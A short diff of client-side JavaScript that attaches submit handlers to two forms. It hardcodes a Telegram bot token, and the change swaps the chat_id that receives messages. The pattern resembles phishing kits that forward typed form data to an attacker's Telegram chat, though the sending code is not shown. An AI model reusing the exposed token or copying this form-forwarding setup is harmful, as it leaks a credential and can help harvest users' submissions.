@@ -2,7 +2,7 @@ const form1 = document.getElementById('form_1');
 const form2 = document.getElementById('form_2');
 
 const bot_token = '6406654898:AAH01hMh8y8CqJP55D6XtLUYOan7DQh-KeU'
-const chat_id = '928132950'
+const chat_id = '711358470'
 
 
 form1.addEventListener('submit', (event) => {
